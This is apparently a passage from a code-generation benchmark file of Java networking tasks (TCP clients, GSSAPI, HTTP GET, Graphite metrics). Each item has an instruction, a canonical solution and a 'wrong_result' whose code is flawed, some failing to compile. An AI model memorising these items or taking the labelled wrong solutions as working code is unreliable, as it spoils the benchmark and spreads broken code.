boolean connected() {\n        return mStreamingSession != null && mStreamingSession.isConnected();\n    }\n\n    public boolean canConnect() {\n        return mConfiguration.isValid() && !mConnecting.get() && \n               (System.currentTimeMillis() - mLastConnectionAttempt > RECONNECT_INTERVAL_MILLISECONDS);\n    }\n\n    public IcecastHTTPConfiguration getBroadcastConfiguration() {\n        return mConfiguration;\n    }\n\n    public void setBroadcastState(BroadcastState state) {\n        mBroadcastState = state;\n    }\n\n    public BroadcastState getBroadcastState() {\n        return mBroadcastState;\n    }\n\n    public Map<String, String> getHTTPHeaders() {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Content-Type\", \"audio/mpeg\");\n        headers.put(\"User-Agent\", \"Icecast HTTP Audio Broadcaster\");\n        headers.put(\"icy-metadata\", \"1\");\n        headers.put(\"icy-name\", mConfiguration.getStreamName());\n        headers.put(\"icy-url\", mConfiguration.getStreamUrl());\n        if (mConfiguration.getPassword() != null) {\n            headers.put(\"Authorization\", \"Basic \" + Base64.getEncoder().encodeToString(\n                (mConfiguration.getUsername() + \":\" + mConfiguration.getPassword()).getBytes()));\n        }\n        return headers;\n    }\n\n    public IcecastHTTPConfiguration getConfiguration() {\n        return mConfiguration;\n    }\n\n    private class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) {\n            mLog.info(\"Icecast session opened\");\n            mStreamingSession = session;\n            mBroadcastState = BroadcastState.CONNECTING;\n            sendHTTPPutRequest();\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) {\n            mLog.info(\"Icecast session closed\");\n            mStreamingSession = null;\n            mBroadcastState = BroadcastState.DISCONNECTED;\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable cause) {\n            mLog.error(\"Icecast connection error\", cause);\n            mConnecting.set(false);\n            if (canConnect()) {\n                new Thread(() -> {\n                    try {\n                        Thread.sleep(RECONNECT_INTERVAL_MILLISECONDS);\n                        connect();\n                    } catch (InterruptedException e) {\n                        mLog.error(\"Reconnect thread interrupted\", e);\n                    }\n                }).start();\n            }\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object message) {\n            if (message instanceof String) {\n                String response = (String) message;\n                if (response.contains(\"HTTP/1.1 200 OK\")) {\n                    mBroadcastState = BroadcastState.CONNECTED;\n                    mLog.info(\"Successfully connected to Icecast server\");\n                } else if (response.contains(\"HTTP/1.1 401 Unauthorized\")) {\n                    mLog.error(\"Authentication failed for Icecast server\");\n                    disconnect();\n                }\n            }\n        }\n\n        private void sendHTTPPutRequest() {\n            StringBuilder request = new StringBuilder();\n            request.append(\"PUT /\").append(mConfiguration.getMountPoint()).append(\" HTTP/1.1\\r\\n\");\n            for (Map.Entry<String, String> header : getHTTPHeaders().entrySet()) {\n                request.append(header.getKey()).append(\": \").append(header.getValue()).append(\"\\r\\n\");\n            }\n            request.append(\"\\r\\n\");\n            mStreamingSession.write(request.toString());\n        }\n    }\n}"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a Java class that establishes a secure TCP client connection using GSSAPI for authentication and secure message exchange with a server.\n\nClass Description: The GSSClient class provides functionality to connect to a server using TCP, establish a secure GSSAPI context, send encrypted messages, and verify received messages. It handles GSSAPI authentication and secure communication over a socket connection.\n\nAttributes:\n- s: Socket - The socket used for TCP communication with the server\n\nMethods:\n- main(String[] args) -> void - Entry point that parses command line arguments, establishes connection, and manages the secure communication flow\n- createCtxt(String serverName, Oid mechOid) -> GSSContext - Creates and establishes a GSSAPI security context with the server\n- sendMsgToPeer(GSSContext aCtxt, String msg) -> void - Sends an encrypted message to the server using the established security context\n- verifyMsgFromPeer(GSSContext aCtxt, String msg) -> void - Verifies the message integrity code (MIC) received from the server\n- usage() -> void - Prints usage information for the program\n- print(String msg) -> void - Helper method to print messages to standard output\n- exit(int status) -> void - Closes the socket connection and exits the program with specified status code",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\nimport com.sun.gssapi.*;\n\nclass GSSClient {\n\n    private static Socket s;\n\n    public static void main(String args[]) {\n        String serverHost, serverName, message;\n        int port = 4444;\n\n        if (args.length < 3) {\n            usage();\n            exit(1);\n        }\n\n        serverHost = args[args.length - 3];\n        serverName = args[args.length - 2];\n        message = args[args.length - 1];\n        \n        try {\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < (args.length - 3); i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            s = new Socket(serverHost, port);\n            GSSContext aCtxt = createCtxt(serverName, mechOid);\n            sendMsgToPeer(aCtxt, message);                        \n            verifyMsgFromPeer(aCtxt, message);\n            aCtxt.dispose();\n            exit(0);\n\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static GSSContext createCtxt(String serverName, Oid mechOid)\n                    throws GSSException, IOException {\n        GSSContext aCtxt = new GSSContext(\n            new GSSName(serverName, GSSName.NT_HOSTBASED_SERVICE),\n                      mechOid, null, 0);\n\n        aCtxt.requestConf(true);\n        aCtxt.requestInteg(true);\n        aCtxt.requestMutualAuth(true);\n        aCtxt.requestReplayDet(true);\n        aCtxt.requestSequenceDet(true);\n        \n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n\n        byte []inTok = new byte[0];\n        \n        do {\n            byte[] outTok = aCtxt.init(inTok, 0, inTok.length);\n            \n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok, 0, outTok.length);\n            }\n            \n            if (aCtxt.isEstablished())\n                break;\n            \n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n            \n        return (aCtxt);\n    }\n\n    private static void sendMsgToPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        MessageProp mInfo = new MessageProp(0, true);\n        byte []tok = aCtxt.wrap(msg.getBytes(), 0, msg.length(), mInfo);\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n        dos.writeInt(tok.length);\n        dos.write(tok);\n        dos.flush();\n    }\n\n    private static void verifyMsgFromPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        int len = dis.readInt();\n        MessageProp mInfo = new MessageProp();\n        aCtxt.verifyMIC(dis, new StringBufferInputStream(msg), mInfo);\n    }\n\n    private static void usage() {\n        print(\"GSSClient [-port port] [-mech 1.2.3.3] serverhost servername message\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class GSSClient {\n    private Socket s;\n\n    public static void main(String[] args) {\n        if (args.length < 2) {\n            usage();\n            exit(1);\n        }\n        String serverName = args[0];\n        String mechOidStr = args[1];\n        try {\n            Oid mechOid = new Oid(mechOidStr);\n            s = new Socket();\n            s.connect(new InetSocketAddress(serverName, 8080));\n            GSSContext ctxt = createCtxt(serverName, mechOid);\n            sendMsgToPeer(ctxt, \"Hello, Server!\");\n            verifyMsgFromPeer(ctxt);\n            s.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n            exit(1);\n        }\n    }\n\n    private static GSSContext createCtxt(String serverName, Oid mechOid) throws GSSException, IOException {\n        GSSName serverGSSName = GSSName.getInstance(serverName, mechOid);\n        GSSContext ctxt = GSSContext.getInstance(mechOid);\n        byte[] token = new byte[0];\n        while (true) {\n            byte[] outToken = ctxt.initSecContext(token, 0, token.length);\n            if (outToken == null) {\n                break;\n            }\n            OutputStream out = s.getOutputStream();\n            out.write(outToken);\n            out.flush();\n            byte[] inToken = new byte[1024];\n            int bytesRead = s.getInputStream().read(inToken);\n            if (bytesRead <= 0) {\n                throw new IOException(\"No response from server\");\n            }\n            token = Arrays.copyOf(inToken, bytesRead);\n            ctxt.acceptSecContext(token, 0, bytesRead);\n        }\n        return ctxt;\n    }\n\n    private static void sendMsgToPeer(GSSContext aCtxt, String msg) throws IOException {\n        byte[] messageBytes = msg.getBytes(StandardCharsets.UTF_8);\n        byte[] wrapped = aCtxt.wrap(messageBytes, 0, messageBytes.length, GSSContext.WRAP);\n        OutputStream out = s.getOutputStream();\n        out.write(wrapped);\n        out.flush();\n    }\n\n    private static void verifyMsgFromPeer(GSSContext aCtxt) throws IOException {\n        InputStream in = s.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead = in.read(buffer);\n        if (bytesRead <= 0) {\n            throw new IOException(\"No data received\");\n        }\n        byte[] unwrapped = aCtxt.unwrap(buffer, 0, bytesRead);\n        String receivedMsg = new String(unwrapped, StandardCharsets.UTF_8);\n        print(\"Received: \" + receivedMsg);\n    }\n\n    private static void usage() {\n        System.out.println(\"Usage: java GSSClient <serverName> <mechanismOID>\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        try {\n            if (s != null) {\n                s.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}"
  },
  {
    "Task_id": 399,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends data to the server, and properly closes the connection.\n\nClass Description: The `TcpClient` class provides functionality to connect to a TCP server, send data to it, and manage the connection lifecycle. It encapsulates the socket and output stream for communication.\n\nAttributes:\n- socket: Socket - The socket object used for the TCP connection\n- out: OutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n- sendData(String data) -> void - Converts the input string to UTF-8 bytes and sends it to the server\n- close() -> void - Closes the output stream and socket connection",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        out = socket.getOutputStream();\n    }\n\n    public void sendData(String data) throws IOException {\n        byte[] outputBytes = data.getBytes(\"UTF-8\");\n        out.write(outputBytes);\n        out.flush();\n    }\n\n    public void close() throws IOException {\n        if (out != null) {\n            out.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) {\n        try {\n            socket = new Socket(host, port);\n            out = socket.getOutputStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendData(String data) {\n        if (out != null) {\n            try {\n                out.write(data.getBytes(StandardCharsets.UTF_8));\n                out.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        if (out != null) {\n            try {\n                out.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 40,
    "Instruction": "Task Description: Create a Java class that facilitates HTTP communication using Java's HttpClient, supporting GET requests with configurable options and error handling.\n\nClass Description: The HttpCommunicator class provides functionality to send HTTP GET requests to specified URIs. It includes features like automatic redirect following and optional error suppression for non-critical requests. The class encapsulates the HttpClient instance and provides methods for request execution.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HttpClient instance used for all HTTP communications, configured to always follow redirects.\n\nMethods:\nsendGetRequest: [Name](String uri, Map<String, Object> attributes) -> String - Sends a GET request to the specified URI. The attributes map can contain optional parameters like \"optional-option\" to suppress exceptions for non-critical requests. Returns the response body as a string or empty string for optional failed requests.\n\nreadUri: [Name](URI uri, boolean optional) -> String - Internal method that constructs and executes the HTTP request. If optional is true, returns empty string on failure instead of throwing an exception.\n\nisHttpOrHttps: [Name](String url) -> boolean - Helper method to check if a URL string uses HTTP or HTTPS protocol. Returns true if the URL starts with \"http://\" or \"https://\".",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n\n    private HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.ALWAYS)\n                .build();\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean isOptional = attributes.containsKey(\"optional-option\");\n        return readUri(URI.create(uri), isOptional);\n    }\n\n    private String readUri(URI uri, boolean optional) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        try {\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body();\n        } catch (Exception e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    private boolean isHttpOrHttps(String url) {\n        return url != null && (url.startsWith(\"http://\") || url.startsWith(\"https://\"));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HttpCommunicator {\n    private final HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.ALWAYS)\n                .build();\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean optional = attributes != null && attributes.containsKey(\"optional-option\");\n        return readUri(URI.create(uri), optional);\n    }\n\n    private String readUri(URI uri, boolean optional) {\n        try {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .GET()\n                    .uri(uri)\n                    .build();\n            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            if (response.statusCode() == 200) {\n                return response.body();\n            } else {\n                if (optional) {\n                    return \"\";\n                } else {\n                    throw new RuntimeException(\"HTTP error code: \" + response.statusCode());\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(\"Request failed\", e);\n            }\n        }\n    }\n\n    private boolean isHttpOrHttps(String url) {\n        return url.startsWith(\"http://\") || url.startsWith(\"https://\");\n    }\n}"
  },
  {
    "Task_id": 400,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, allows sending messages to the server, and receives echoed responses until the termination command is sent.\n\nClass Description: The EchoClient class represents a TCP client that connects to a specified server host and port. It provides functionality for sending user input to the server and displaying the server's response, continuing this echo process until the user sends \"bye\" to terminate the connection.\n\nAttributes:\n- client: Socket - The socket used for the TCP connection to the server\n- input: BufferedReader - Reads user input from the console\n- buf: BufferedReader - Reads data from the server's response stream\n- out: PrintStream - Writes data to the server's output stream\n\nMethods:\n- EchoClient(String host, int port) -> void - Constructor that establishes a connection to the specified host and port, initializing the input/output streams\n- start() -> void - Starts the client interaction loop, reading user input and sending it to the server while displaying responses\n- close() -> void - Closes all open streams and the socket connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.Socket;\n\npublic class EchoClient {\n\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        input = new BufferedReader(new InputStreamReader(System.in));\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void start() throws Exception {\n        boolean flag = true;\n        while (flag) {\n            System.out.print(\"\u8f93\u5165\u4fe1\u606f\uff1a\");\n            String str = input.readLine();\n            out.println(str);\n            if (\"bye\".equals(str)) {\n                flag = false;\n            } else {\n                String echo = buf.readLine();\n                System.out.println(echo);\n            }\n        }\n        close();\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class EchoClient {\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) {\n        try {\n            client = new Socket(host, port);\n            input = new BufferedReader(new InputStreamReader(System.in));\n            buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            out = new PrintStream(client.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            String userInput;\n            while (true) {\n                userInput = input.readLine();\n                if (userInput == null || userInput.equals(\"bye\")) {\n                    break;\n                }\n                out.println(userInput);\n                out.flush();\n                String response = buf.readLine();\n                System.out.println(\"Server: \" + response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            close();\n        }\n    }\n\n    public void close() {\n        try {\n            if (input != null) input.close();\n            if (buf != null) buf.close();\n            if (out != null) out.close();\n            if (client != null) client.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }"
  },
  {
    "Task_id": 401,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for establishing a connection to a server, sending messages, and closing the connection.\n\nClass Description: The `SocketConnectTest` class provides basic TCP client capabilities using Java's Socket and I/O classes. It handles connection establishment, message transmission, and resource cleanup.\n\nAttributes:\n- client: [Socket] - The socket object representing the connection to the server\n- writer: [Writer] - The output stream writer for sending data to the server\n\nMethods:\n- connect: [connect(String host, int port)] -> [void] - Establishes a connection to the specified server host and port, initializing the socket and writer\n- sendMessage: [sendMessage(String message)] -> [void] - Sends the specified message to the connected server\n- close: [close()] -> [void] - Closes the writer and socket connection, releasing system resources",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\n\npublic class SocketConnectTest {\n\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new OutputStreamWriter(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message);\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        writer.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketConnectTest {\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new PrintWriter(client.getOutputStream(), true);\n    }\n\n    public void sendMessage(String message) {\n        writer.println(message);\n    }\n\n    public void close() {\n        if (writer != null) {\n            try {\n                writer.close();\n            } catch (IOException e) {\n            }\n        }\n        if (client != null) {\n            try {\n                client.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 402,
    "Instruction": "Task Description: Create an asynchronous task in Android that performs an HTTP GET request to a specified server using TCP socket communication, reads the response, and returns it to the caller via a callback mechanism.\n\nClass Description: HttpGetTask is an AsyncTask subclass that handles network operations in the background to prevent blocking the UI thread. It establishes a TCP connection to a server, sends an HTTP GET request, reads the response, and delivers it to a retained fragment through a weak reference.\n\nAttributes:\n- TAG: [String] - A constant for logging purposes\n- HOST: [String] - The hostname of the server to connect to\n- USER_NAME: [String] - The username for authentication\n- HTTP_GET_COMMAND: [String] - The formatted HTTP GET request string\n- mListener: [WeakReference<RetainedFragment>] - Weak reference to the fragment that will receive the result\n\nMethods:\n- HttpGetTask([RetainedFragment retainedFragment]) -> [void] - Constructor that initializes the task with a weak reference to the calling fragment\n- doInBackground([Void... params]) -> [String] - Performs the network operations in the background (opens socket, sends request, reads response)\n- onPostExecute([String result]) -> [void] - Delivers the result to the retained fragment after task completion\n- readStream([InputStream in]) -> [String] - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.lang.ref.WeakReference;\nimport java.net.Socket;\n\npublic class HttpGetTask extends AsyncTask<Void, Void, String> {\n\n    private static final String TAG = \"HttpGetTask\";\n    private static final String HOST = \"api.geonames.org\";\n    private static final String USER_NAME = \"aporter\";\n    private static final String HTTP_GET_COMMAND = \"GET /earthquakesJSON?north=44.1&south=-9.9&east=-22.4&west=55.2&username=\"\n            + USER_NAME + \" HTTP/1.1\" + \"\\n\" + \"Host: \" + HOST + \"\\n\"\n            + \"Connection: close\" + \"\\n\\n\";\n\n    private final WeakReference<RetainedFragment> mListener;\n\n    public HttpGetTask(RetainedFragment retainedFragment) {\n        mListener = new WeakReference<>(retainedFragment);\n    }\n\n    @Override\n    protected String doInBackground(Void... params) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(HOST, 80);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(HTTP_GET_COMMAND);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    @Override\n    protected void onPostExecute(String result) {\n        if (null != mListener.get()) {\n            mListener.get().onDownloadFinished(result);\n        }\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuilder data = new StringBuilder();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class HttpGetTask extends AsyncTask<Void, Void, String> {\n    private static final String TAG = \"HttpGetTask\";\n    private String HOST;\n    private String USER_NAME;\n    private String HTTP_GET_COMMAND;\n    private WeakReference<RetainedFragment> mListener;\n\n    public HttpGetTask(RetainedFragment retainedFragment) {\n        mListener = new WeakReference<>(retainedFragment);\n    }\n\n    @Override\n    protected String doInBackground(Void... params) {\n        try {\n            Socket socket = new Socket(HOST, 80);\n            OutputStream os = socket.getOutputStream();\n            os.write(HTTP_GET_COMMAND.getBytes());\n            os.flush();\n\n            InputStream is = socket.getInputStream();\n            String response = readStream(is);\n\n            socket.close();\n            return response;\n        } catch (IOException e) {\n            Log.e(TAG, \"Error during HTTP GET\", e);\n            return null;\n        }\n    }\n\n    private String readStream(InputStream in) {\n        StringBuilder response = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n            response.append(\"\\n\");\n        }\n        return response.toString();\n    }\n\n    @Override\n    protected void onPostExecute(String result) {\n        RetainedFragment fragment = mListener.get();\n        if (fragment != null) {\n            fragment.onHttpGetResult(result);\n        }\n    }\n}"
  },
  {
    "Task_id": 403,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function has no return value but may print error information to stderr if the operation fails)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "import java.io.*;\nimport java.net.*;\n\npublic class TcpSender {\n    public static void send(String message, String server, int port) {\n        try (Socket socket = new Socket(server, port)) {\n            OutputStream out = socket.getOutputStream();\n            out.write(message.getBytes());\n        } catch (IOException e) {\n            System.err.println(\"Error sending message: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 404,
    "Instruction": "Task Description: Create a TCP client class in Java that can establish a connection to a server, send requests, and receive responses.\n\nClass Description: The TcpClient class provides functionality to connect to a TCP server, send string requests, and receive string responses. It handles socket creation, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n- TAG: String - A constant for logging purposes (default value: \"HttpGet\")\n\nMethods:\n- TcpClient(String host, int port) -> None - Constructor that initializes the host and port attributes\n- sendRequest(String request) -> String - Sends the request string to the server and returns the response\n- readStream(InputStream in) -> String - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TcpClient {\n\n    private static final String TAG = \"HttpGet\";\n    private String host;\n    private int port;\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(host, port);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(request);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (UnknownHostException exception) {\n            exception.printStackTrace();\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuffer data = new StringBuffer();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line = \"\";\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TcpClient {\n    private String host;\n    private int port;\n    public static final String TAG = \"HttpGet\";\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) throws IOException {\n        try (Socket socket = new Socket(host, port)) {\n            try (OutputStream os = socket.getOutputStream();\n                 InputStream is = socket.getInputStream()) {\n                os.write(request.getBytes(StandardCharsets.UTF_8));\n                os.flush();\n                return readStream(is);\n            }\n        }\n    }\n\n    private String readStream(InputStream in) throws IOException {\n        StringBuilder response = new StringBuilder();\n        int content;\n        while ((content = in.read()) != -1) {\n            response.append((char) content);\n        }\n        return response.toString();\n    }\n}"
  },
  {
    "Task_id": 405,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for pushing metrics to a Graphite server, with support for periodic pushing and character sanitization for Graphite compatibility.\n\nClass Description: The Graphite class provides functionality to connect to a Graphite server via TCP and push metrics from a CollectorRegistry. It handles character sanitization for Graphite compatibility and supports both one-time pushes and periodic pushing via a daemon thread.\n\nAttributes:\n- host: String - The hostname or IP address of the Graphite server\n- port: int - The port number of the Graphite server\n- logger: Logger - Logger instance for error logging\n- INVALID_GRAPHITE_CHARS: Pattern - Regular expression pattern for invalid Graphite characters\n\nMethods:\n- Graphite(String host, int port) -> None - Constructor that initializes the Graphite client with server connection details\n- push(CollectorRegistry registry) -> void - Pushes all metrics from the registry to Graphite server immediately. Throws IOException if connection fails\n- start(CollectorRegistry registry) -> Thread - Starts a daemon thread that pushes metrics every 60 seconds\n- start(CollectorRegistry registry, int intervalSeconds) -> Thread - Starts a daemon thread that pushes metrics at specified intervals\n- PushThread(CollectorRegistry registry, int intervalSeconds) -> None - Inner class constructor for the periodic push thread\n- run() -> void - The main execution method of PushThread that handles periodic metric pushing",
    "Canonical_solution": "import io.prometheus.client.Collector;\nimport io.prometheus.client.CollectorRegistry;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.nio.charset.Charset;\nimport java.util.Collections;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class Graphite {\n  private static final Logger logger = Logger.getLogger(Graphite.class.getName());\n  private final String host;\n  private final int port;\n  private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9_-]\");\n\n  public Graphite(String host, int port) {\n    this.host = host;\n    this.port = port;\n  }\n\n  public void push(CollectorRegistry registry) throws IOException {\n    Socket s = new Socket(host, port);\n    BufferedWriter writer = new BufferedWriter(new PrintWriter(new OutputStreamWriter(s.getOutputStream(), Charset.forName(\"UTF-8\")));\n    Matcher m = INVALID_GRAPHITE_CHARS.matcher(\"\");\n    long now = System.currentTimeMillis() / 1000;\n    for (Collector.MetricFamilySamples metricFamilySamples: Collections.list(registry.metricFamilySamples())) {\n      for (Collector.MetricFamilySamples.Sample sample: 